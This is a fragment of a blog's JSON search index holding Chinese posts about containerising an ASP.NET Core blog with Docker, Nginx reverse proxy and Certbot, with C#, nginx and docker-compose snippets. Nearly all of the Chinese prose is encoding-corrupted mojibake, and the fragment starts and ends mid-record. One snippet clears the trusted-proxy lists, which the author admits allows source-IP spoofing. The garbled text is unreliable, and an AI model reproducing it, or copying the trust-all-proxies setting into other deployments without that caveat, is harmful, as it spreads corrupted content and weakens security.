ç•¶ä½œè³‡æ–™åº«ï¼Ÿ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå‰è¨€ ç™¼è¡¨ Docker ç­†è¨˜ä»¥ä¾†ï¼Œä¸€ç›´æœ‰ç¶²å‹æé†’æ‡‰æ”¹ç”¨ Kubernetes (K8S)ï¼Œé—œæ–¼é€™é»åœ¨å‰ç¯‡æ–‡ç« å·²ç¶“æéï¼Œç”¨ Docker / Docker-Compose ç©ç©å°ç¶²ç«™é‚„ OKï¼Œä¸€æ—¦æ¶‰åŠé«˜å¯ç”¨æ€§å¦‚å‚™æ´ã€è² è¼‰å¹³è¡¡ï¼Œè‹¥ä¸ä¾è³´ç¾æˆç®¡ç†æ¶æ§‹ï¼Œç¶­é‹æ“ä½œå°‡è¤‡é›œåˆ°æœƒå’¬äººã€‚è€Œ Kubernetes æ­£æ˜¯ç›®å‰å®¹å™¨ç®¡ç†æ¡†æ¶çš„ä¸»æµæ¥­ç•Œæ¨™æº–ï¼Œå°¤å…¶å¦‚æ‰“ç®—å°‡å®¹å™¨ç›´æ¥éƒ¨ç½²åˆ°é›²ç«¯å» å•†(Azureã€AWSã€Google GCP)ï¼Œä¸æœƒ Kubernetes æ›´æ˜¯å¯¸æ­¥é›£è¡Œã€‚æ•…åœ¨æ¬¡è²æ˜ä»¥æ­£è¦–è½ï¼Œåœ¨ä¼æ¥­ç’°å¢ƒå¦‚éœ€è€ƒé‡é«˜å¯ç”¨æ€§ã€è² è¼‰å¹³è¡¡æˆ–æƒ³ç›´æ¥éƒ¨ç½²åˆ°å» å•†é›²ç«¯ï¼Œä¸€èˆ¬ä¸æœƒç”¨ Docker-Compose è€Œæœƒæ¡ç”¨ Kubernetesï¼Œè«‹å¤§å®¶æ³¨æ„ã€‚\né€™ç¯‡ç­†è¨˜æ˜¯æˆ‘å°‡éƒ¨è½æ ¼ç¶²ç«™ç§»å…¥ Docker å®¹å™¨çš„ç¶“é©—åˆ†äº«ï¼Œå°‡è¨˜éŒ„ Miniblog.Core ASP.NET Core ç¶²ç«™æ¬é€² Docker éç¨‹é‡åˆ°çš„ä¸€äº›çœ‰è§’ã€‚\nReverse Proxy å•é¡Œ ç”±æ–¼æˆ‘æ‰“ç®—åœ¨åŒä¸€æ©Ÿå™¨ä¸Šå…±äº«å°å¤– IP è·‘å¤šå€‹ç¶²ç«™ï¼Œå› æ­¤æ¡è¡Œå‰ä¸€ç¯‡ç­†è¨˜æ‰€èªªçš„ã€Œä»¥ Compose çµ„åˆç¶²ç«™èˆ‡ DBï¼Œç¶²ç«™å°æ˜  Host IP/Portï¼ŒNginx å¦è·‘å®¹å™¨å°å‘å„ç¶²ç«™ Portã€ç­–ç•¥ã€‚\nç›®éŒ„å°æ‡‰ éƒ¨è½æ ¼ç¶²ç«™æœ‰ä¸€äº›åŸ·è¡ŒæœŸé–“æ›´æ–°çš„å…§å®¹ï¼ŒåŒ…å« NLog Log æª”ã€æ–‡ç« åœ–æª”ã€SQLitï½… è³‡æ–™åº«ç­‰ï¼Œé€™äº›å…§å®¹ä¸é©åˆæ”¾åœ¨å®¹å™¨è£¡ï¼Œæ•…éƒ½éœ€è¨­ Volume å°æ˜ åˆ° Host OS çš„å¯¦éš›æª”æ¡ˆï¼Œå¦‚æ­¤å®¹å™¨å¯ä»»æ„åˆªé™¤é‡å»ºåŠå‡ç´šï¼Œç®¡ç†é‹ç”¨è¼ƒæ–¹ä¾¿ã€‚\næ™‚å€å•é¡Œ è¸©äº†é›·æ‰çŸ¥é“ï¼šDocker å®¹å™¨å…§çš„æ™‚å€è·Ÿ Host OS æ˜¯è„«é‰¤çš„ã€‚å³ä¾¿æœ¬æ©Ÿå·²è¨­å¥½å®šç‚ºå°åŒ—æ™‚å€ï¼ŒDocker å®¹å™¨é è¨­ç‚º UTC+0 æ™‚å€ï¼Œæœ‰å…©ç¨®åšæ³•ï¼š\nåœ¨ docker-compose.yml ä¸­åŠ è¨»ç’°å¢ƒåƒæ•¸ TZ æ–°å¢ Volume å°æ˜  /etc/localtime:/etc/localtime:roï¼Œè¦æ±‚å®¹å™¨ä»¥ Host OS çš„æ™‚å€ç‚ºæº– ç¬¬ä¸€ç¨®åšæ³•é‡åˆ°ä»¥ Alpine Linux ç‰ˆ Image å»ºçš„å®¹å™¨éœ€è¦é¡å¤–è£å¥—ä»¶ï¼Œæ•…å°æ˜  /etc/localtime è¼ƒå–®ç´”ã€‚\nåƒè€ƒï¼šè¨­å®š Docker Container èˆ‡ Host ç›¸åŒæ™‚å€çš„æ–¹æ³•\nå–å¾—çœŸå¯¦ä¾†æº IP å•é¡Œ Reverse Proxy ä¾†æº IP åœ¨ ASP.NET Core + Nginx on CentOS å®‰è£ç­†è¨˜ æéï¼Œç•¶ ASP.NET Core æ¶è¨­åœ¨ Reverse Proxy å¾Œæ–¹ï¼Œç›´æ¥çœ‹åˆ°çš„æ˜¯ Reverse Proxy çš„ IPï¼Œè¦å¾—åˆ°çœŸå¯¦ä¾†æº IPï¼Œåœ¨ Nginx config éœ€åŠ è¨» proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_forï¼Œé€é HTTP Header å‚³éå…§å®¹ã€‚è€Œ ASP.NET Core ç¨‹å¼ä¹Ÿéœ€ä¿®æ”¹ï¼š\n1 2 3 4 5 6 7 public void Configure(IApplicationBuilder app, IHostingEnvironment env) { app.UseForwardedHeaders(new ForwardedHeadersOptions { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }); } ä¸éè‹¥ ASP.NET Core é‹è¡Œæ–¼å®¹å™¨ï¼Œç¶å®šçš„ IP ä¸æ˜¯ 127.0.0.1 è€Œæ˜¯éš”é›¢ç¶²æ®µ 172.1x.0.x IPï¼Œæ­¤è¡Œç‚ºæ‰“ç ´ UseForwardedHeaders å‡è¨­ Request ä¾†è‡ª localhost çš„å‰é¡Œï¼Œå°±ç®—è¨­äº† ForwardedHeadersï¼Œ IHttpContextAccessor.HttpContext.Connection.RemoteIpAddress è®€åˆ°çš„ä»æ˜¯ 172.1x.0.1 (éš”é›¢ç¶²æ®µçš„ Gateway IP)ã€‚\nç”± ASP.NET Core çš„åŸå§‹ç¢¼ï¼Œæª¢æŸ¥è¦å‰‡ç‚ºè‹¥ ForwardedHeadersOptions.KnownNetworks æˆ– ForwardedHeadersOptions.KnownProxies æœ‰è¨­å®šï¼Œä¾†æº IP å¿…é ˆè¦æ˜¯ KnownNetworks æˆ– KnownProxies æ‰æœƒèªå®šè«‹æ±‚ç‚º Proxy è½‰å‚³ã€‚è€Œ KnownNetworks åŠ KnownProxies é è¨­åªæœ‰æœ¬æ©Ÿ IPã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 // ... /// \u0026lt;summary\u0026gt; /// Addresses of known proxies to accept forwarded headers from. /// \u0026lt;/summary\u0026gt; public IList\u0026lt;IPAddress\u0026gt; KnownProxies { get; } = new List\u0026lt;IPAddress\u0026gt;() { IPAddress.IPv6Loopback }; /// \u0026lt;summary\u0026gt; /// Address ranges of known proxies to accept forwarded headers from. /// \u0026lt;/summary\u0026gt; public IList\u0026lt;IPNetwork\u0026gt; KnownNetworks { get; } = new List\u0026lt;IPNetwork\u0026gt;() { new IPNetwork(IPAddress.Loopback, 8) }; // ... è§£æ±ºæ–¹æ³•æœ‰å…©ç¨®ï¼Œä¸€ç¨®æ˜¯å°‡ 172.x.0.0 åŠ å…¥ ForwardedHeadersOptions.KnownNetworksï¼Œä½†ç¶²æ®µç‚º Docker è‡ªç”±èª¿é…ï¼Œæœ€å¥½å¯«æˆè‡ªå‹•åµæ¸¬ä¸å®œå¯«æ­»ã€‚\nå¦ä¸€å€‹è§£æ³•æ˜¯å°‡ KnownNetworks èˆ‡ KnownProxies éƒ½æ¸…ç©ºï¼Œä¸€èˆ¬æœ‰ä¾†æº IP è¢«å½é€ çš„é¢¨éšªï¼Œä½†æˆ‘å€‘ ASP.NET Core ç¶²ç«™æ¶æ§‹ Nginx Reverse Proxy æ˜¯å”¯ä¸€çš„å…¥å£ï¼Œæ•…æˆ‘å°‡å…¶è¦–ç‚ºå¯æ¥å—åšæ³•ï¼š\n1 2 3 4 5 6 7 var forwardingOptions = new ForwardedHeadersOptions() { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }; forwardingOptions.KnownNetworks.Clear(); //its loopback by default forwardingOptions.KnownProxies.Clear(); app.UseForwardedHeaders(forwardingOptions); åƒè€ƒï¼š\nè®°å½•Dockeréƒ¨ç½²asp.net coreåº”ç”¨æ—¶ä½¿ç”¨åå‘ä»£ç†çš„å‘ IIS Reverse Proxy å¾Œ RemoteIpAddress å–å€¼éŒ¯èª¤ Stackoverlow è¨è«– Nginx å…§å®¹å£“ç¸®å•é¡Œ è·‘äº†ä¸€é™£å­æ‰ç™¼ç¾ï¼Œæˆ‘ç”¨çš„ Nginx + Certbot å®¹å™¨çš„ Nginx è¨­å®šæª” /etc/nginx/nginx.conf é è¨­æœªé–‹å•Ÿ GZIP å£“ç¸®ã€‚\næˆ‘çš„è§£æ³•æ˜¯æ–°å¢ Volume å°æ˜ å°‡ /etc/nginx/nginx.conf å°æ‡‰åˆ° Host /etc/nginx/nginx.confï¼Œä¸¦ä¿®æ”¹å¢åŠ  gzip é‚£æ®µå…§å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 user nginx; worker_processes 1; error_log /var/log/nginx/error.log warn; pid /var/run/nginx.pid; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; gzip on; gzip_min_length 1000; gzip_buffers 4 16k; gzip_comp_level 5; gzip_types text/plain application/x-javascript text/css application/xml text/javascript; include /etc/nginx/conf.d/*.conf; } Nginx å£“ç¸®è¨­å®šçš„æ„ç¾©å¯åƒè€ƒå®˜æ–¹æ–‡ä»¶\n","date":"2022-12-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-09/dotnet-core-docker-note-4/","title":"ASP.NET Core Docker ç­†è¨˜ 4 - ASP.NET Core ç¶²ç«™å®¹å™¨åŒ–ç¶“é©—åˆ†äº«"},{"content":" åƒè€ƒç¶²ç«™\nå‰è¨€ å‰ç¯‡æ–‡ç« ä»‹ç´¹éä½¿ç”¨ Docker Compose è¨­å®šé—œè¯å®¹å™¨(Webã€DBã€Reverse Proxy)çµ„æˆç³»çµ±ï¼Œå®¹å™¨è¢«éš”é›¢åœ¨å°ˆç”¨ç¶²æ®µ(Compose è‡ªå‹•å»ºç«‹çš„ Bridge)ï¼Œä¸¦å¯é€éå®¹å™¨åç¨±å½¼æ­¤æºé€šï¼ŒCompose ä¹Ÿç¢ºä¿ç›¸é—œæœå‹™ä¸€èµ·å•Ÿå‹•ä¸€èµ·é—œé–‰ï¼Œæ˜¯ç”¨å¤šå€‹å®¹å™¨å»ºæ§‹ç³»çµ±æœ€ç°¡ä¾¿çš„åšæ³•ã€‚\nè¨»ï¼šé—œæ–¼å®¹å™¨ç®¡ç† Kubernetesï¼ŒK8S æä¾›æ›´å¼·å¤§çš„åŠŸèƒ½ï¼Œæ”¯æ´ Cluster é«˜å¯ç”¨æ¶æ§‹ (å–®ä¸€å®¹å™¨ã€ä¸»æ©Ÿæ›æ‰ç³»çµ±ä¸æœƒæ­»)ï¼Œç‚ºç•¶ä»Šåœ¨é›²ç«¯æ›è¼‰å®¹å™¨ä»¥åŠä¸­å¤§å‹ä¼æ¥­å¯¦åšå®¹å™¨æ¶æ§‹çš„ä¸»æµï¼ŒK8S ç„¡ç–‘å¯å–ä»£ Docker Composeï¼Œä½†å…¶è¤‡é›œæ€§è¼ƒé«˜ã€‚ ç›®å‰æˆ‘åœ¨å–®ä¸€ Linux æ©Ÿè·‘ Docker é‚„ç”¨ä¸åˆ°ç‰›åˆ€(é›–ç„¶æœ‰å–®æ©Ÿç‰ˆ Minikube å¯ç”¨)ï¼Œæœªä¾†è‹¥è¦å°‡ Docker æ‡‰ç”¨æ–¼å·¥ä½œï¼ŒK8S å·²æˆå¿…è¦æŠ€èƒ½ã€‚\nç”¨ Docker Compose çµ„åˆå®¹å™¨å»ºç«‹æœå‹™çœ‹ä¼¼å®Œç¾ï¼Œä½†æ‡‰ç”¨åœ¨ Reverse Proxy (Nginx) æ™‚éœ€è¦é¡å¤–è€ƒé‡ã€‚\næˆ‘æ‰“ç®—åœ¨åŒä¸€å° Linux ä¸Šè·‘å¤šå€‹ç¶²ç«™ï¼Œå°å¤–ç”¨åŒä¸€å€‹ IPï¼Œå†ä¾ HTTP Request çš„ Host æ¨™é ­å°å‘ä¸åŒç¶²ç«™ã€‚\nèˆ‰ä¾‹ èˆ‰å€‹ä¾‹å­ï¼šå‡è¨­ Linux çš„å°å¤– IP æ˜¯ 123.123.123.123ï¼Œæˆ‘ç”³è«‹å…©å€‹ DNS åç¨± web1.xxx.com.twã€web2.xxx.com.tw éƒ½æŒ‡å‘ 123.123.123.123ã€‚\nä½¿ç”¨è€…ç”¨ http://web1.xxx.com.tw é€£ä¸Š 123.123.123.123 çš„ 80 Port æ™‚ï¼ŒReverse Proxy å°å‘ Web1 ç¶²ç«™ï¼›ç”¨ http://web2.xxx.com.tw æ™‚é€£ç·šæ™‚å‰‡å°å‘ Web2 ç¶²ç«™ã€‚ç”±æ–¼å°å¤–éœæ…‹ IP ç‚ºçè²´è³‡æºï¼Œå¤šç¶²ç«™é€é Host å…±ç”¨ IP æ˜¯ç¯€çœæˆæœ¬çš„å¸¸è¦‹åšæ³•ã€‚\nä¸Šè¿°ä»¥ HTTP Host åç¨±å°å‘çš„åšæ³•ï¼Œè‹¥ç”¨ Docker Compose å°‡ç¶²ç«™é€£åŒ Reverse Proxy åŒ…åœ¨ä¸€èµ·ï¼Œå°±å¯èƒ½å‡ºå•é¡Œã€‚\nä¾‹å¦‚ï¼šæŸ Host OS è·‘å…©å€‹ç¶²ç«™ï¼Œè‹¥å„è‡ªç”¨ Docker Compose é€£åŒ Nginx ä¸€èµ·åŒ…é€²å»ï¼Œç¶²ç«™ A ç”± Web-A + MySQL-A + Nginx-A çµ„æˆï¼Œç¶²ç«™ B ç”± Web-B + MySQL-B + Nginx-B çµ„æˆï¼ŒäºŒè€…è·‘åœ¨è‡ªå·±çš„å°ˆå±¬ç¶²æ®µï¼Œåƒ… Nginx-A è·Ÿ Nginx-B å°æ˜ åˆ° Host OS IP çš„ 80 Port\u0026hellip; å“¦å“¦ï¼Œè¡çªå‡ºç¾äº†ï¼ŒNginx-A èˆ‡ Nginx-B éƒ½éœ€å°æ˜  Host IP çš„ 80 Portï¼Œä½† Host OS çš„ 80 Port åªå…è¨±è¢«ä¸€å€‹ç¨‹åºä½¿ç”¨ã€‚\nè§£æ±ºæ–¹å¼ æœ‰å¹¾å€‹è§£æ±ºæ–¹å‘ï¼š\nNginx-A èˆ‡ Nginx-B å„è‡ªå°æ‡‰åˆ°ä¸»æ©Ÿä¸åŒ Portï¼Œæ›´å‰ç«¯å†æ›ä¸€å° Nginx è½ 80 Portï¼Œä¾ Host Name å°å‘åˆ° Nginx-A èˆ‡ Nginx- Bï¼Œå¦‚æ­¤ Nginx-A èˆ‡ Nginx-B çš„è§’è‰²é¡¯å¾—å¤šé¤˜ï¼Œå¤šäº†ä¸€æ¬¡è½‰æ¥ä½†æœªçœ‹åˆ°æ˜é¡¯æ•ˆç›Šï¼Œå¾’å¢è¤‡é›œæ€§åˆè€—ææ•ˆèƒ½ã€‚\nå°‡å…©å€‹ç³»çµ±åŒ…æˆä¸€å€‹å¤§ Docker Composeï¼ŒWeb-A + MySQL-A + Web-B + MySQL-B + Nginxï¼Œå…±ç”¨ Nginx å¯é¿å… Port 80 ç¹«çµè¡çªï¼Œä½†å°‡ä¸ç›¸é—œç³»çµ±ç¶æ¶æˆä¸€åœ˜ï¼Œè¢«è¿«ä¸€èµ·å•Ÿå‹•ä¸€èµ·åœæ­¢æŒºé³¥çš„ï¼Œæ›´ä¸ç”¨æä¸€æ—¦åŠ è·‘æ–°æœå‹™å°±è¦æ”¹ Docker Composeï¼Œæˆ‘è¦ºå¾—ä¸è¡Œã€‚\nå°‡ Nginx å¾ Docker Compose æŠ½é›¢ï¼Œè®“ Web-A èˆ‡ Web-B å°æ˜ åˆ° Host IP çš„ä¸åŒ Portï¼Œæ•´å€‹ Host OS åªè·‘ä¸€ä»½ Nginx è½ 80 Portï¼Œä¾ Host Name åˆ†æ´¾çµ¦ç¶²ç«™ A æˆ–ç¶²ç«™ Bã€‚ä¹Ÿå°±æ˜¯ç”¨ Docker Compose åŸ·è¡Œä¸‰å€‹å®¹å™¨ï¼š\nWeb-A + MySQL-A Web-B + MySQL-B Ngnix 3 æ˜¯æˆ‘èªç‚ºè¼ƒå¯è¡Œä¸”æœ‰æ•ˆç‡çš„åšæ³•ã€‚\nNginx åŒ…å®¹å™¨çš„åšæ³•åœ¨ç¬¬ä¸€ç¯‡ç­†è¨˜å·²æéï¼Œé€™æ¬¡æˆ‘å€‘å°‡é‡é»æ”¾åœ¨æ•´åˆ Certbot åŠ docker-compose.yml å®šç¾©ã€‚\nåŸæœ¬æƒ³æŠ“ Nginx çš„ Docker Image è‡ªè¡ŒåŠ è£ certbot å¯¦ç¾è‡ªå‹•å®‰è£èˆ‡æ›´æ–° Let\u0026rsquo;s Encrypt SSL æ†‘è­‰ã€‚\nç”¨ Docker çš„å¥½è™•æ˜¯è³‡æºè±å¯Œï¼Œå¾ˆå¿«åœ¨ç¶²è·¯ä¸Šæ‰¾åˆ°ç¾æˆè§£æ±ºæ–¹æ¡ˆï¼Œè¶…ç´šå¥½ç”¨çš„å…¨è‡ªå‹•åŒ– Nginx + Certbot -\u0026gt; staticfloat/nginx-certbotã€‚\nstaticfloat/nginx-certbot staticfloat/nginx-certbot\nä½¿ç”¨æ–¹æ³•å¾ˆç°¡å–®ï¼Œåœ¨ /etc/nginx/conf.d æ”¾ä¸€å€‹ certbot.conf æ¥å— 80 Port æµé‡ï¼Œåªç”¨æ–¼æ¥æ”¶ Let\u0026rsquo;s Encrypt çš„ /.well-known/acme-challenge è¦æ±‚å°å‘ Certbot å®Œæˆè‡ªå‹•é©—è­‰ï¼Œå…¶é¤˜å‰‡ä¸€å¾‹å°å‘ HTTPSï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 server { # Listen on plain old HTTP listen 80 default_server; # Pass this particular URL off to certbot, to authenticate HTTPS certificates location \u0026#39;/.well-known/acme-challenge\u0026#39; { default_type \u0026#34;text/plain\u0026#34;; proxy_pass http://localhost:1337; } # Everything else gets shunted over to HTTPS location / { return 301 https://$http_host$request_uri; } } æ¥è‘—åœ¨ /etc/nginx/conf.d ç‚ºæ¯å€‹ç¶²ç«™æ–°å¢ä¸€å€‹ someweb.conf æ‰¿æ¥ HTTPS è«‹æ±‚ã€‚server_name è¨»æ˜è©²ç¶²ç«™ç¶å®šçš„ Host åç¨±(DNS åç¨±)ï¼Œssl_certificateã€ssl_certficate_key å‰‡æŒ‡å‘ /etc/letsencrypt/live/DNSåç¨± çš„ fullchain.pem åŠ private.pemï¼Œé€™å…©å€‹æª”æ¡ˆä¸éœ€äº‹å…ˆæº–å‚™ï¼ŒCertbot æœƒè‡ªå‹•ç”¢ç”Ÿï¼Œè‡³æ–¼ proxy_* ç›¸é—œè¨­å®šæ¯”ç…§å…ˆå‰ä»‹ç´¹éçš„åšæ³•ã€‚å®Œæ•´ç¯„ä¾‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 server { listen 443 ssl; server_name blog.darkthread.net; ssl_certificate /etc/letsencrypt/live/blog.darkthread.net/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.darkthread.net/privkey.pem; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } é€™å€‹ Docker Image æœ‰ä¸€æ®µç²¾å·§è¨­è¨ˆï¼Œå®ƒåœ¨å•Ÿå‹•æ™‚æœƒä¸»å‹•æƒç„ /etc/nginx/conf.d ä¸‹çš„ configï¼Œä¸€æ—¦åµæ¸¬ç¼ºå°‘ /etc/letsencrypt/live/*/fullchain.pem å°±é€£ä¸Š Let\u0026rsquo;s Encrypt ç¶²ç«™é€²è¡Œé©—è­‰ä¸‹è¼‰ SSL æ†‘è­‰ï¼Œå¦å¤–é‚„è¨­äº†æ¯é€±ä¸€æ¬¡çš„æ’ç¨‹ï¼Œæ†‘è­‰åˆ°æœŸå‰æœƒè‡ªå‹•æ›´æ–°ï¼Œä¸€æ°£å–æˆï¼Œå…¨ä¸æ²¾æ‰‹ï¼Œè²¼å¿ƒåˆ°æˆ‘æƒ³èµ·ç«‹é¼“æŒã€‚\nè‹¥å°å®ƒçš„é‹ä½œåŸç†æœ‰èˆˆè¶£ï¼ŒGithub æœ‰åŸå§‹ç¢¼å¯ä»¥åƒè€ƒã€‚\nç‚ºäº†ç­è§£åŸç†ï¼Œæˆ‘æ˜¯ä¾è‘— Github åŸå§‹ç¢¼è‡ªå·±è·‘ Dockerfile è£½ä½œ Nginx + Certbot çš„ Imageï¼Œå¦‚æœå«Œéº»ç…©ï¼Œç›´æ¥å¾ Docker Hub ä¸‹è¼‰ä¹Ÿæˆã€‚\nä»¥ä¸‹æ˜¯æˆ‘çš„ Nginx docker-compose.ymlï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 version: \u0026#34;3\u0026#34; services: nginx: image: nginx-certbot container_name: nginx ports: - 80:80 - 443:443 volumes: - /var/log/nginx:/var/log/nginx - /etc/nginx/conf.d:/etc/nginx/conf.d - /etc/letsencrypt:/etc/letsencrypt restart: always environment: - CERTBOT_EMAIL=your-email@mail.com network_mode: \u0026#34;host\u0026#34; æˆ‘è¨­äº†ä¸‰å€‹ Volume å°æ˜ ï¼š\n/var/log/nginxï¼šLog æª” /etc/nginx/conf.dï¼šè¨­å®šæª” /etc/letsencryptï¼šç”¨ä¾†å­˜æ”¾ SSL æ†‘è­‰ è‹¥ç‚º SELinux è¨˜å¾—è¦ chcon -Rt åƒè€ƒï¼Œå¦å¤– network_mode æŒ‡å®š host è¡¨ç¤º Nginx å®¹å™¨å°‡ç›´æ¥ä½¿ç”¨ Host OS ç¶²æ®µï¼Œä¸å¦è¨­ Bridgeã€‚\nåƒè€ƒï¼šDocker Compose éˆæ¥å¤–éƒ¨å®¹å™¨çš„å¹¾ç¨®æ–¹å¼\nå°±é†¬ï¼ŒNginx Reverse Proxy æº–å‚™å¥½äº†ï¼Œä¸‹ä¸€ç¯‡ä¾†å†ä¾†åˆ†äº«æˆ‘å°‡ ASP.NET Core æ¬é€² Docker çš„ç¶“é©—ã€‚\n","date":"2022-12-08T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-08/dotnet-core-docker-note-3/","title":"ASP.NET Core Docker ç­†è¨˜ 3 - å…±ç”¨ Nginx å®¹å™¨èˆ‡ Certbot æ•´åˆ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nä¸Šç¯‡æ–‡ç« é«”é©—éåœ¨ CentOS ç”¨ Docker Container åˆ†åˆ¥è·‘ Nginx è·Ÿ ASP.NET Core ç¶²ç«™ï¼Œä¸¦å»ºç«‹ Reverse Proxy é—œä¿‚ï¼Œæ¥è‘—æ¢è¨åœ¨å¯¦å‹™ä¸Šç•¶éœ€è¦å¤šå€‹ Container å”åŒé‹ä½œæ™‚æ‡‰å¦‚ä½•è¦åŠƒæ•´åˆã€‚\nä¸€å€‹ç³»çµ±å¸¸å¯å†æ‹†è§£æˆå¤šå€‹æœå‹™ã€‚ä»¥ç·šä¸Šè³¼ç‰©ç¶²ç«™ç‚ºä¾‹ï¼Œå°±å¯èƒ½æ˜¯ç”± ASP.NET Core ç¶²ç«™(Kestrel)ã€MySQL è³‡æ–™åº«ã€Reverse Proxyã€é‡‘æµ Gateway\u0026hellip; ç­‰å¤šå€‹æœå‹™çµ„æˆï¼Œè‹¥è¦ä»¥ Docker Container å¯¦ç¾ï¼Œæœ‰å¹¾ç¨®ç­–ç•¥ï¼š\nç­–ç•¥ 1. å…¨éƒ¨è£åœ¨å–®ä¸€ Container æ’°å¯«ä¸€å€‹ Dockerfileï¼Œä»¥ MySQL è³‡æ–™è³‡æ–™åº«ç‚ºåŸºåº•ï¼Œåœ¨ä¸Šé¢å®‰è£ ASP.NET Core Runtimeã€Nginx çµ„è£åˆæˆç¸ã€‚\nå¥½è™•æ˜¯ä¸€å€‹ Container æå®šï¼Œé«˜å…§èšä½è€¦åˆï¼Œä¸æœƒå› ç›¸ä¾æœå‹™æ²’é…ç½®å¥½æˆ–æœªå•Ÿå‹•è€Œæ•…éšœã€‚ä½†ç¼ºé»æŒºæ˜é¡¯ï¼š\næŸäº› Container Image ç‚ºæ±‚è¼•å·§ä½œæ¥­ç³»çµ±å±¤æ¬¡çš„å·¥å…·ã€ç¨‹å¼åº«å¾ˆç²¾ç°¡(ä¾‹å¦‚ï¼šNginx Container é€£ ping éƒ½æ²’æœ‰)ï¼Œåªæ±‚ç›®æ¨™ç¨‹å¼èƒ½åŸ·è¡Œå°±å¥½ï¼Œè¦åŠ è£å…¶ä»–è»Ÿé«”æ™‚è¦é»æŠ€å·§ï¼Œå¾—å¤šèŠ±äº›å¿ƒæ€ã€‚ å…¨éƒ¨ç¶åœ¨ä¸€èµ·ä¾¿å¤±å»å‹•æ…‹èª¿é…çš„å½ˆæ€§ï¼Œä¾‹å¦‚ï¼šç•¶å‰ç«¯ Web è² è¼‰éé«˜æ™‚ï¼Œæ“´å……ä¸æ˜“ã€‚ ç•¶éœ€è¦å€‹åˆ¥å‡ç´šè³‡æ–™åº«ã€ASP.NET Core ç‰ˆæœ¬ï¼Œæˆ–æ˜¯æƒ³æŠ½æ›æœå‹™çµ„åˆæ™‚æ‰‹çºŒè¤‡é›œï¼Œæœ‰é•æ¨¡çµ„åŒ–ç²¾ç¥ã€‚ 2. ä»¥å€‹åˆ¥ Container åŸ·è¡Œï¼Œç¨ç«‹æ§åˆ¶ å¦‚åŒå‰ç¯‡æ–‡ç« çš„åšæ³•ï¼ŒASP.NET Core ç¶²ç«™è·‘ Cotainer ç¹«çµåˆ° Host OS çš„ 5000 Portï¼Œç”¨ Container è·‘ MySQLï¼Œå†ç”¨ Container è·‘ Ngnix ç¹«çµåˆ° Host OS 80 Portï¼Œå†è¨­å®š Reverse Proxy è¦å‰‡ã€‚\nContainer é–“ä¸²æ¥é…ç½®å…¨é äººå·¥ï¼Œç³»çµ±ç®¡ç†å“¡éœ€å”åŠ©å“ªå€‹ Container è½å“ªå€‹ Portï¼Œç¢ºä¿å½¼æ­¤ä¸è¡çªã€‚å¦‚æ­¤åšæœ‰å…©å€‹ç¼ºé»ï¼š\nç›¸ä¾æœå‹™çš„å•Ÿå‹•ç‹€æ…‹æœªé€£å‹•ï¼Œéœ€é äººç‚ºæ§åˆ¶ç¢ºä¿å…ˆå•Ÿå‹•è³‡æ–™åº« Container å†å•Ÿå‹•ç¶²ç«™ Container çš„é †åºã€‚ è‹¥ Host OS è·‘å¤šå€‹ç³»çµ±éƒ½ç”¨åˆ° MySQLï¼Œç³»çµ±ç®¡ç†å“¡éœ€å”èª¿ TCP Port ä¸è¡çªï¼ŒDocker çš„ Bridge (æ©‹æ¥å™¨)éš”é›¢ç¶²æ®µæ©Ÿåˆ¶å…¨ç„¡ç”¨æ­¦ä¹‹åœ°ã€‚ 3. ä»¥å€‹åˆ¥ Container åŸ·è¡Œï¼Œä½†ä½¿ç”¨ Docker Compose é—œè¯ ç‚ºæ»¿è¶³å¤š Container å”åŒä½œæ¥­éœ€æ±‚ï¼ŒDocker Compose æ‡‰é‹è€Œç”Ÿã€‚\nDocker Compose å®šç¾©äº†ä¸€å¥—å®£å‘Šèªæ³•(æ¡ç”¨ YAML æ ¼å¼)ï¼Œåœ¨å…¶ä¸­å®šç¾©å„æœå‹™ Container çš„å•Ÿå‹•åƒæ•¸ã€èˆ‡ Host OS Port å°æ˜ ã€éš¸å±¬ Bridge ç¶²æ®µã€Volume è³‡æ–™å¤¾/æª”æ¡ˆå°æ‡‰ç­‰ç­‰ã€‚\nDocker Compose æœƒè‡ªå‹•ç‚º Container å»ºç«‹éš”é›¢ç¶²æ®µä¸¦è¨­å¥½åç¨±è§£æï¼Œè®“ Container ä½¿ç”¨å®¹å™¨åç¨±è§£ææˆ IP æ‰¾åˆ°å…¶ä»– Containerï¼Œå› æ­¤è¨­å®šé€£ç·šå­—ä¸²æˆ– URL æ™‚ä¾¿å¯å¯«æˆ httq://myweb:5000ã€mongodb://mydbï¼Œæ¸…æ¥šåˆæ–¹ä¾¿ã€‚\næœ€é‡è¦æ˜¯é€é docker-compose up/down 